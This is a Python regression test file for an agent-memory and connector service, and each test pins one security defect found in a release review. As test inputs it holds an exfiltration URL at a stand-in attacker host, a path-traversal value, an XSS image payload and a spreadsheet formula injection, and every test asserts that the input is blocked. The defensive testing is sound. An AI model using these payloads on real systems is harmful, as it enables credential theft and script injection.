"""Regressions from the release review after 1.1.0.

Each test pins one defect that review found: an input that produced a 500, a
credential that could leave its host, a value that reached a page unescaped,
a one-time code that worked twice, or data a purge left behind.
"""

import io
import json
import time
import urllib.error
from unittest.mock import MagicMock, patch

import pyotp

from app.connectors.base import Credential
from app.connectors.generic_http import GenericHttpConnector
from app.connectors.http_engine import HttpEngine
from app.database import get_db
from app.services import (
    activity_service,
    agent_service,
    audit_service,
    auth_service,
    memory_service,
    workspace_service,
)


def _admin(token):
    return {"Authorization": f"Bearer {token}"}


def _mcp(client, headers, tool, **params):
    return client.post("/mcp", headers=headers, json={"tool": tool, "params": params})


def _agent(agent_id, read, write):
    with get_db() as conn:
        owner_id = conn.execute("SELECT id FROM users LIMIT 1").fetchone()["id"]
    _, key = agent_service.create_agent(
        agent_id=agent_id, display_name=agent_id, owner_user_id=owner_id,
        read_scopes=read, write_scopes=write,
    )
    return {"Authorization": f"Bearer {key}"}


# --- MCP input validation ----------------------------------------------------


def test_mcp_activity_update_rejects_an_unknown_status(test_client, admin_token, agent_token):
    headers = {"Authorization": f"Bearer {agent_token}"}
    opened = _mcp(test_client, headers, "activity_update", memory_scope="agent:testagent",
                  task_description="Work", status="active")
    assert opened.status_code == 201, opened.json()

    # Used to reach the database CHECK constraint and answer with a 500.
    response = _mcp(test_client, headers, "activity_update", memory_scope="agent:testagent",
                    status="done", handoff={"completed": "Everything"})
    assert response.status_code == 400
    assert response.json()["error"]["code"] == "INVALID_STATUS"


def test_a_task_ref_only_update_is_an_update_not_a_heartbeat(test_client, admin_token, agent_token, monkeypatch):
    headers = {"Authorization": f"Bearer {agent_token}"}
    events = []
    monkeypatch.setattr(activity_service, "notify", lambda event, *a, **k: events.append(event))
    _mcp(test_client, headers, "activity_update", memory_scope="agent:testagent",
         task_description="Work", status="active")

    response = _mcp(test_client, headers, "activity_update", memory_scope="agent:testagent",
                    task_ref="tracker:7")
    assert response.status_code == 200, response.json()
    assert events[-1] == "activity_updated"


# --- memory_verify stays inside the caller's scopes ---------------------------


def test_memory_verify_without_a_scope_only_touches_writable_scopes(test_client, admin_token):
    workspace_service.create_workspace("mine", "Mine", "admin")
    workspace_service.create_workspace("theirs", "Theirs", "admin")
    headers = _agent("verifier", ["workspace:mine"], ["workspace:mine"])
    mine, _ = memory_service.write_memory("Fact here", "fact", "workspace:mine", subject_anchor="repo:nowhere.py")
    theirs, _ = memory_service.write_memory("Fact there", "fact", "workspace:theirs", subject_anchor="repo:nowhere.py")

    response = _mcp(test_client, headers, "memory_verify")
    assert response.status_code == 200, response.json()
    ids = {r["record_id"] for r in response.json()["data"]["results"]}
    assert mine["id"] in ids and theirs["id"] not in ids
    assert memory_service.get_memory_record(theirs["id"])["last_verify_attempt_at"] is None


# --- credentials stay on their host --------------------------------------------


def test_generic_http_does_not_send_the_credential_to_another_host():
    connector = GenericHttpConnector()
    config = {"base_url": "https://api.example.com/v1", "auth_location": "header"}
    cred = Credential(raw="secret", fields={}, reference_name="r")

    result = connector._call(cred, config, {"url": "https://attacker.example/collect"})
    assert result["success"] is False and "base_url" in result["error"]

    fake = MagicMock()
    fake.read.return_value = b'{"ok": true}'
    fake.status = 200
    fake.headers = {}
    fake.__enter__ = lambda s: s
    fake.__exit__ = MagicMock(return_value=False)
    with patch("app.connectors.generic_http.safe_urlopen", return_value=fake) as opened, \
            patch("app.connectors.generic_http.validate_public_url"):
        same_host = connector._call(cred, config, {"url": "https://api.example.com/other/path"})
    assert same_host["success"] is True, same_host
    assert opened.call_args[0][0].full_url == "https://api.example.com/other/path"


def test_http_engine_path_params_cannot_leave_their_segment():
    engine = HttpEngine({"id": "t", "backend_json": json.dumps({
        "base_url": {"from": "config", "field": "base_url"},
        "requests": {"get_item": {"method": "GET", "path": "/items/{{ params.item_id }}"},
                     "open": {"method": "GET", "path": "{{ params.target }}"}},
    })})
    config = {"base_url": "https://api.example.com"}

    req = engine._build_request(engine.spec["requests"]["get_item"], {"item_id": "../../admin?x="}, config)
    assert req["url"] == "https://api.example.com/items/..%2F..%2Fadmin%3Fx%3D"

    # Only a manifest that is literally absolute may replace base_url.
    req = engine._build_request(engine.spec["requests"]["open"], {"target": "https://attacker.example/x"}, config)
    assert req["url"].startswith("https://api.example.com/")


def test_upstream_bodies_are_read_with_a_cap():
    import pytest

    from app.security.safe_http import ResponseTooLargeError, read_capped

    with pytest.raises(ResponseTooLargeError, match="exceeded 10 bytes"):
        read_capped(io.BytesIO(b"x" * 100), 10)
    assert read_capped(io.BytesIO(b"x" * 100), 10, truncate=True) == b"x" * 10
    assert read_capped(io.BytesIO(b"short"), 10) == b"short"


# --- one-time codes are one-time ----------------------------------------------


def test_an_otp_code_cannot_be_replayed(clean_db):
    auth_service.create_user("testuser", "user@test.local", "testpassword123", "Test User", "user")
    pending = auth_service.enroll_otp("testuser")
    totp = pyotp.TOTP(pending["secret"])
    assert auth_service.confirm_otp_enrollment("testuser", totp.now())

    code = totp.now()
    assert auth_service.verify_otp("testuser", code) is True
    assert auth_service.verify_otp("testuser", code) is False  # seen in transit, replayed
    # The next time step's code is still accepted (it is inside the window).
    assert auth_service.verify_otp("testuser", totp.at(time.time() + 30)) is True


# --- what reaches the dashboard is escaped ------------------------------------


def test_the_audit_page_escapes_a_forged_client_address(test_client, admin_token):
    payload = "<img src=x onerror=alert(1)>"
    audit_service.write_event("user", "admin", "session_login", result="failure", ip_address=payload)

    page = test_client.get("/audit", headers=_admin(admin_token))
    assert page.status_code == 200
    assert payload not in page.text and "&lt;img" in page.text

    # A page number that is not a number is page one, not a 500.
    assert test_client.get("/audit?page=abc", headers=_admin(admin_token)).status_code == 200
    assert test_client.get("/activity?page=abc", headers=_admin(admin_token)).status_code == 200


def test_the_audit_csv_export_neutralises_formulas(test_client, admin_token):
    audit_service.write_event("user", "=HYPERLINK(\"http://x\")", "session_login", result="failure")
    with get_db() as conn:
        admin_id = conn.execute("SELECT id FROM users WHERE role = 'admin' LIMIT 1").fetchone()["id"]
    session = auth_service.create_session(admin_id, channel="dashboard")
    response = test_client.get("/api/dashboard/audit/export", cookies={"session_token": session["session_id"]})
    assert response.status_code == 200
    assert "'=HYPERLINK" in response.text


# --- a purge leaves nothing behind --------------------------------------------


def test_purging_a_workspace_removes_its_change_feed(test_client, admin_token):
    workspace_service.create_workspace("gone", "Gone", "admin")
    memory_service.write_memory("Secret-ish preview text", "fact", "workspace:gone")
    with get_db() as conn:
        assert conn.execute("SELECT COUNT(*) FROM workspace_changes WHERE memory_scope = ?", ("workspace:gone",)).fetchone()[0]

    response = test_client.post("/api/workspaces/gone/purge", headers=_admin(admin_token))
    assert response.status_code == 200, response.json()
    with get_db() as conn:
        assert conn.execute("SELECT COUNT(*) FROM workspace_changes WHERE memory_scope = ?", ("workspace:gone",)).fetchone()[0] == 0


# --- bad input is a 400, not a 500 --------------------------------------------


def test_a_malformed_credential_scope_is_a_400(test_client, admin_token):
    response = test_client.post("/api/credentials/entries", headers=_admin(admin_token), json={
        "scope": "workspace:Bad Id", "name": "x", "value": "y",
    })
    assert response.status_code == 400, response.text


# --- the broker runner survives a timeout --------------------------------------


def test_broker_runner_treats_a_read_timeout_as_unresolved(monkeypatch):
    from runner import agent_core_broker

    def _timeout(*args, **kwargs):
        raise TimeoutError("timed out")

    monkeypatch.setattr(agent_core_broker.urllib.request, "urlopen", _timeout)
    assert agent_core_broker.resolve_reference("AC_SECRET_X", "agent", "tok", "http://127.0.0.1:1") is None

    def _http_error(*args, **kwargs):
        raise urllib.error.HTTPError("u", 403, "forbidden", {}, None)

    monkeypatch.setattr(agent_core_broker.urllib.request, "urlopen", _http_error)
    assert agent_core_broker.resolve_reference("AC_SECRET_X", "agent", "tok", "http://127.0.0.1:1") is None


# --- an over-cap body is an error, not a cut-off document -----------------------


class _HugeResponse:
    """Answers every read with one byte more than was asked for."""

    status = 200
    headers = {}

    def read(self, n=-1):
        return b"x" * (n + 1 if n and n > 0 else 1)

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


def test_generic_http_reports_an_over_cap_body(monkeypatch):
    monkeypatch.setattr("app.security.safe_http.MAX_RESPONSE_BYTES", 100)
    monkeypatch.setattr("app.connectors.generic_http.safe_urlopen", lambda req, timeout=30: _HugeResponse())
    monkeypatch.setattr("app.connectors.generic_http.validate_public_url", lambda url: None)
    connector = GenericHttpConnector()

    result = connector._call(Credential(raw="s", fields={}, reference_name="r"),
                             {"base_url": "https://api.example.com"}, {"path": "/big"})
    assert result == {"success": False, "error": "upstream response exceeded 100 bytes",
                      "error_code": "RESPONSE_TOO_LARGE"}


def test_http_engine_reports_an_over_cap_body(monkeypatch):
    monkeypatch.setattr("app.security.safe_http.MAX_RESPONSE_BYTES", 100)
    engine = HttpEngine({"id": "t", "backend_json": json.dumps({
        "base_url": {"from": "config", "field": "base_url"},
        "requests": {"big": {"method": "GET", "path": "/big"}},
    })})
    monkeypatch.setattr(engine, "_send", lambda req, config: _HugeResponse())
    monkeypatch.setattr(engine, "_raise_on_errors", lambda resp, credential: None)

    result = engine.execute("big", {}, Credential(raw="s", fields={}, reference_name="r"),
                            json.dumps({"base_url": "https://api.example.com"}))
    assert result["success"] is False and result["error_code"] == "RESPONSE_TOO_LARGE"
    assert result["error"] == "upstream response exceeded 100 bytes"


def test_openapi_executor_reports_an_over_cap_body(monkeypatch):
    from app.connectors.openapi_executor import OpenApiExecutor

    monkeypatch.setattr("app.security.safe_http.MAX_RESPONSE_BYTES", 100)
    monkeypatch.setattr("app.connectors.openapi_executor.safe_urlopen", lambda req, timeout=30: _HugeResponse())
    monkeypatch.setattr("app.connectors.openapi_executor.validate_public_url", lambda url: None, raising=False)
    spec = {"servers": ["https://api.example.com"],
            "operations": [{"operation_id": "big", "method": "GET", "path": "/big"}]}

    result = OpenApiExecutor().execute("big", {}, None, json.dumps({"_operations_json": spec}))
    assert result["success"] is False and result["error_code"] == "RESPONSE_TOO_LARGE"
    assert result["error"] == "upstream response exceeded 100 bytes"


# --- a non-2xx upstream reply is a result, not a crash -------------------------


def test_http_engine_returns_a_404_with_its_body(monkeypatch):
    """The HTTPError wrapper must read like a urllib response (read_capped asks for a size)."""
    body = json.dumps({"error": "no such task"}).encode()

    def fake_urlopen(request, timeout=30):
        raise urllib.error.HTTPError(request.full_url, 404, "Not Found",
                                     {"Content-Type": "application/json"}, io.BytesIO(body))

    engine = HttpEngine({"id": "t", "backend_json": json.dumps({
        "base_url": {"from": "config", "field": "base_url"},
        "requests": {"task_status": {"method": "GET", "path": "/tasks/{id}"}},
    })})
    monkeypatch.setattr("app.connectors.http_engine.safe_urlopen", fake_urlopen)
    monkeypatch.setattr("app.connectors.http_engine.validate_public_url", lambda url: None)

    result = engine.execute("task_status", {"id": "x"}, Credential(raw="s", fields={}, reference_name="r"),
                            json.dumps({"base_url": "https://api.example.com"}))
    assert result["success"] is False
    assert result["status"] == 404
    assert result["body"] == {"error": "no such task"}
